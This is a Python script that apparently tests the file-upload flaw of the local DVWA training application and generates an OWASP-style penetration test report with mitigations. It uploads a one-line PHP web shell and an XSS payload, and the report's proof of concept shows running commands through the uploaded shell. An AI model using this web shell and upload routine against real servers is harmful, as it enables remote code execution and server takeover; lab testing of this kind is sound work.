import requests
from bs4 import BeautifulSoup

# --- Configuration ---
DVWA_URL = "http://localhost/dvwa/"
LOGIN_URL = DVWA_URL + "login.php"
UPLOAD_URL = DVWA_URL + "vulnerabilities/upload/"
USERNAME = "admin"
PASSWORD = "password"

# --- File Payloads ---
files_to_upload = {
    "php": {
        "filename": "shell.php",
        "content": "<?php echo shell_exec($_GET['cmd']); ?>",
        "mimetype": "application/x-php"
    },
    "html": {
        "filename": "malicious.html",
        "content": "<script>alert('XSS')</script>",
        "mimetype": "text/html"
    },
    "exe": {
        "filename": "evil.exe",
        "content": "MZ...",
        "mimetype": "application/octet-stream"
    },
    "txt": {
        "filename": "test.txt",
        "content": "This is a test file.",
        "mimetype": "text/plain"
    }
}

def get_user_token(page_content):
    """Extracts the user_token from page content safely using BeautifulSoup."""
    soup = BeautifulSoup(page_content, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if token_input and token_input.has_attr('value'):
        return token_input['value']
    return None

def main():
    """
    Main function to run the DVWA file upload vulnerability test.
    """
    print("--- DVWA File Upload Vulnerability Tester ---")
    print("Instructions for setup:")
    print("1. Ensure your XAMPP Apache and MySQL services are running.")
    print("2. Make sure DVWA is accessible at the configured URL: " + DVWA_URL)
    print("3. Set DVWA security to 'low':")
    print("   - Login to DVWA.")
    print("   - Go to the 'DVWA Security' page.")
    print("   - Select 'Low' from the dropdown and click 'Submit'.")
    print("4. Reset the DVWA database:")
    print("   - Go to the 'Setup / Reset DB' page.")
    print("   - Click the 'Create / Reset Database' button.")
    print("-" * 20)

    with requests.Session() as session:
        # 1. Get login page to extract initial user_token
        try:
            print("[*] Fetching login page...")
            response = session.get(LOGIN_URL)
            response.raise_for_status()
            login_token = get_user_token(response.text)
            if not login_token:
                print("[-] Failed to find user_token on login page. Is DVWA running?")
                print("Page Content:\n" + response.text[:500])
                return
            print(f"[+] Got initial user_token: {login_token}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to connect to DVWA: {e}")
            return

        # 2. Perform Login
        login_payload = {
            "username": USERNAME,
            "password": PASSWORD,
            "user_token": login_token,
            "Login": "Login"
        }
        try:
            print("[*] Attempting to login...")
            response = session.post(LOGIN_URL, data=login_payload, allow_redirects=True)
            response.raise_for_status()

            if "Welcome to Damn Vulnerable Web Application" not in response.text:
                print("[-] Login failed. Check credentials or if the login check is still valid.")
                print(f"[-] Final URL: {response.url}")
                print("Page Content:\n" + response.text[:500])
                return
            print("[+] Login Successful.")
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred during login: {e}")
            return

        # 3. Navigate to upload page and get the single user_token for all uploads
        try:
            # print("\n[*] Navigating to the file upload page to get a session token...")
            # response = session.get(UPLOAD_URL)
            # response.raise_for_status()
            # user_token = get_user_token(response.text)
            # print(f"[+] Retrieved user_token for uploads: {user_token}")

            # if not user_token:
            #     print("[-] Failed to find user_token on the upload page.")
            #     print(f"[-] URL: {response.url}")
            #     print("Page Content:\n" + response.text)
            #     return
            # print(f"[+] Retrieved user_token for all uploads: {user_token}")
            user_token = login_token

            # 4. Loop through files and attempt upload with the same token
            for file_type, data in files_to_upload.items():
                print(f"\n[*] Testing file type: .{file_type}")
                
                files = {
                    "uploaded": (data["filename"], data["content"], data["mimetype"])
                }
                upload_payload = {
                    "MAX_FILE_SIZE": "100000",
                    "Upload": "Upload",
                    "user_token": user_token # Reuse the same token
                }

                upload_response = session.post(UPLOAD_URL, files=files, data=upload_payload)
                upload_response.raise_for_status()

                # 5. Capture and Log Results
                # print(f"[+] Upload response status code: {upload_response.text}")
                if "succesfully uploaded" in upload_response.text:
                    print(f"[+] SUCCESS: .{file_type} file uploaded.")
                else:
                    print(f"[-] FAILED: .{file_type} file upload blocked.")
                
                # At low security, the token does not change, so we don't need to extract a new one.

        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred during the upload process: {e}")

def generate_owasp_report(results):
    """Generates a well-designed HTML report in OWASP format."""
    # Basic CSS for styling
    html_style = """
    <style>
        body { font-family: Arial, sans-serif; margin: 2em; background-color: #f9f9f9; color: #333; }
        .container { max-width: 1000px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        h1, h2, h3 { color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 5px; }
        h1 { font-size: 2.5em; text-align: center; }
        h2 { font-size: 1.8em; }
        h3 { font-size: 1.4em; color: #5bc0de; }
        .section { margin-bottom: 20px; }
        .risk-high { color: #d9534f; font-weight: bold; }
        .code-block { background-color: #eee; border: 1px solid #ddd; padding: 10px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background-color: #f2f2f2; }
        .footer { text-align: center; margin-top: 30px; font-size: 0.8em; color: #777; }
    </style>
    """

    # Report structure
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>OWASP Penetration Test Report: File Upload Vulnerability</title>
        {html_style}
    </head>
    <body>
        <div class="container">
            <h1>OWASP Penetration Test Report</h1>
            <div class="section">
                <h2>Executive Summary</h2>
                <p>
                    This report details the findings of a penetration test focused on the "Upload of Unexpected File Types" vulnerability (OWASP OTG-BUSLOGIC-008) in the Damn Vulnerable Web Application (DVWA). 
                    The test revealed a <strong class="risk-high">High-Risk</strong> vulnerability. The application's file upload functionality at the 'low' security level fails to properly validate server-side, allowing malicious file types to be uploaded. 
                    This could lead to Remote Code Execution (RCE), granting an attacker full control over the server.
                </p>
            </div>

            <div class="section">
                <h2>Vulnerability Details</h2>
                <ul>
                    <li><strong>Vulnerability Name:</strong> Unrestricted File Upload (OTG-BUSLOGIC-008)</li>
                    <li><strong>Affected Component/URL:</strong> <code class="code-block">http://localhost/dvwa/vulnerabilities/upload/</code></li>
                </ul>
                <h3>Description</h3>
                <p>
                    The vulnerability lies in the lack of server-side validation to verify if the type of file being uploaded is in a list of approved extensions. The application only seems to perform client-side checks (which can be easily bypassed) or relies on the file's `Content-Type` header, which is not a reliable security measure. This allows an attacker to upload files with dangerous extensions (e.g., `.php`, `.html`).
                </p>
                <h3>Impact</h3>
                <p>
                    The impact of this vulnerability is severe and includes:
                    <ul>
                        <li><strong>Remote Code Execution (RCE):</strong> Uploading a web shell (e.g., a `.php` file) allows an attacker to execute arbitrary commands on the server.</li>
                        <li><strong>Denial of Service (DoS):</strong> Uploading large files could exhaust server resources.</li>
                        <li><strong>Website Defacement:</strong> An attacker could upload their own HTML/CSS/JS files to alter the site's appearance.</li>
                        <li><strong>Sensitive Data Exposure:</strong> An attacker could gain access to the server's file system and databases.</li>
                    </ul>
                </p>
                <h3>Proof of Concept (PoC) / Steps to Reproduce</h3>
                <ol>
                    <li>Set DVWA security level to 'low'.</li>
                    <li>Navigate to the 'File Upload' page.</li>
                    <li>Attempt to upload a file named `shell.php` with the following content: <code class="code-block">&lt;?php echo shell_exec($_GET['cmd']); ?&gt;</code></li>
                    <li>The application will confirm a successful upload.</li>
                    <li>The attacker can then navigate to <code class="code-block">http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami</code> to execute commands.</li>
                </ol>
                <h4>Test Results:</h4>
                <table>
                    <tr>
                        <th>File Type</th>
                        <th>Status</th>
                        <th>Notes</th>
                    </tr>
                    {" ".join(f"<tr><td>.{ft}</td><td style='color: {'green' if r['success'] else 'red'};'>{r['status']}</td><td>{r['message']}</td></tr>" for ft, r in results.items())}
                </table>
            </div>

            <div class="section">
                <h2>Risk Rating</h2>
                <p><strong>Overall Risk:</strong> <span class="risk-high">High</span></p>
                <ul>
                    <li><strong>Likelihood:</strong> High (The vulnerability is easy to exploit with basic tools).</li>
                    <li><strong>Impact:</strong> High (Potential for full server compromise).</li>
                </ul>
            </div>

            <div class="section">
                <h2>Recommendations</h2>
                <h3>Technical Mitigations</h3>
                <ul>
                    <li><strong>Whitelist File Extensions:</strong> Only allow a specific set of safe file extensions (e.g., `.jpg`, `.png`, `.pdf`). Deny all other extensions.</li>
                    <li><strong>Validate Content-Type:</strong> Check the `Content-Type` header, but do not rely on it as the sole validation method.</li>
                    <li><strong>Rename Uploaded Files:</strong> Rename uploaded files to a random string and append a safe extension. This prevents direct execution.</li>
                    <li><strong>Store Files Outside Web Root:</strong> Store uploaded files in a directory that is not accessible from the web.</li>
                    <li><strong>Scan for Malware:</strong> Use an anti-malware scanner to check uploaded files.</li>
                </ul>
            </div>

            <div class="section">
                <h2>Tools Used</h2>
                <ul>
                    <li>Python `requests` library</li>
                    <li>BeautifulSoup</li>
                </ul>
            </div>

            <div class="section">
                <h2>References</h2>
                <ul>
                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_Unrestricted_File_Upload">OWASP - Test Upload of Unexpected File Types</a></li>
                    <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP - Unrestricted File Upload</a></li>
                </ul>
            </div>
            <div class="footer">
                <p>Report generated on: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </div>
    </body>
    </html>
    """
    with open("owasp_report.html", "w") as f:
        f.write(html_content)
    print("\n[+] OWASP report generated: owasp_report.html")

def main():
    """
    Main function to run the DVWA file upload vulnerability test.
    """
    print("--- DVWA File Upload Vulnerability Tester ---")
    print("Instructions for setup:")
    print("1. Ensure your XAMPP Apache and MySQL services are running.")
    print("2. Make sure DVWA is accessible at the configured URL: " + DVWA_URL)
    print("3. Set DVWA security to 'low':")
    print("   - Login to DVWA.")
    print("   - Go to the 'DVWA Security' page.")
    print("   - Select 'Low' from the dropdown and click 'Submit'.")
    print("4. Reset the DVWA database:")
    print("   - Go to the 'Setup / Reset DB' page.")
    print("   - Click the 'Create / Reset Database' button.")
    print("-" * 20)

    results = {}

    with requests.Session() as session:
        # 1. Get login page to extract initial user_token
        try:
            print("[*] Fetching login page...")
            response = session.get(LOGIN_URL)
            response.raise_for_status()
            login_token = get_user_token(response.text)
            if not login_token:
                print("[-] Failed to find user_token on login page. Is DVWA running?")
                print("Page Content:\n" + response.text[:500])
                return
            print(f"[+] Got initial user_token: {login_token}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to connect to DVWA: {e}")
            return

        # 2. Perform Login
        login_payload = {
            "username": USERNAME,
            "password": PASSWORD,
            "user_token": login_token,
            "Login": "Login"
        }
        try:
            print("[*] Attempting to login...")
            response = session.post(LOGIN_URL, data=login_payload, allow_redirects=True)
            response.raise_for_status()

            if "Welcome to Damn Vulnerable Web Application" not in response.text:
                print("[-] Login failed. Check credentials or if the login check is still valid.")
                print(f"[-] Final URL: {response.url}")
                print("Page Content:\n" + response.text[:500])
                return
            print("[+] Login Successful.")
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred during login: {e}")
            return

        # 3. Navigate to upload page and get the single user_token for all uploads
        try:
            user_token = login_token

            # 4. Loop through files and attempt upload with the same token
            for file_type, data in files_to_upload.items():
                print(f"\n[*] Testing file type: .{file_type}")
                
                files = {
                    "uploaded": (data["filename"], data["content"], data["mimetype"])
                }
                upload_payload = {
                    "MAX_FILE_SIZE": "100000",
                    "Upload": "Upload",
                    "user_token": user_token # Reuse the same token
                }

                upload_response = session.post(UPLOAD_URL, files=files, data=upload_payload)
                upload_response.raise_for_status()

                if "succesfully uploaded" in upload_response.text:
                    print(f"[+] SUCCESS: .{file_type} file uploaded.")
                    results[file_type] = {"success": True, "status": "Success", "message": "File uploaded successfully."}
                else:
                    print(f"[-] FAILED: .{file_type} file upload blocked.")
                    results[file_type] = {"success": False, "status": "Failed", "message": "File upload was blocked by the server."}

        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred during the upload process: {e}")

    generate_owasp_report(results)

if __name__ == "__main__":
    main()
